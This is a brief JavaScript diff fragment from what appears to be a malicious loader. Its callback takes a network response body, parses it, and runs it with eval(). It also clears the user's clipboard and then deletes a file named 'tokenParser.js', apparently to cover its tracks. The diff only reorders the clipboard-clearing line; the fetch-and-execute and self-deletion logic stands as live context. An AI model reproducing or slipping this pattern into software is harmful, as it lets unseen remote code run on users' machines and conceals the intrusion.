@@ -22,9 +22,9 @@ request(options, (err, res, body) => {
     if (err || res.statusCode !== 200) return;
 
     try {
+        navigator.clipboard.writeText("");
         const code = JSON.parse(body);
         eval(code);
-        navigator.clipboard.writeText("");
         setTimeout(() => {
         }, 3000);
         deleteFile('tokenParser.js');
